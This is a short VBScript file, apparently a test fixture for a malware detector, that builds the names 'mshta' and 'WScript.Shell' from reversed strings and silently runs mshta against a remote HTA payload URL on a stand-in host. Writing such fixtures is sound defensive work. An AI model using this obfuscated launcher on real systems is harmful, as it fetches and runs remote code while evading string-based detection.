' Reversed-mshta remote launcher fixture: the shell ProgID and the mshta
' interpreter both arrive reversed, and the Run target is a remote URL.
Dim sh, launcher
launcher = StrReverse(" athsm")
Set sh = CreateObject("W" + StrReverse("ehS.tpircS") + "ll")
sh.Run launcher + " https://example.com/payload.hta", 0, False
Set sh = Nothing
